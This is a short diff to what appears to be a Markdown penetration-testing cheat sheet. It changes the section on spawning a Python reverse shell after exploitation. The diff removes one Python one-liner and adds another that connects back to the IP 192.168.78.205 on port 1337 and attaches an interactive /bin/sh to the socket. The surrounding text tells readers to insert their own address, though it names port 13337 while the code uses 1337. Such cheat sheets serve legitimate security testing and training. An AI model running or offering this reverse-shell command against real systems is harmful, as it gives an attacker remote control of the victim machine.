@@ -35,6 +35,9 @@ This is useful after exploitation and getting a shell. It allows you to use Linu
 
 ## Using Python to do a Reverse Shell
 
-You put your IP address (instead of 10.1.1.1) and the port (instead of 13337) below:
+You put your IP address (instead of 192.168.78.205) and the port (instead of 13337) below:
 
-`python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('10.1.1.1',1337))\n while 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"`
+```
+python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.78.205",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+```
+
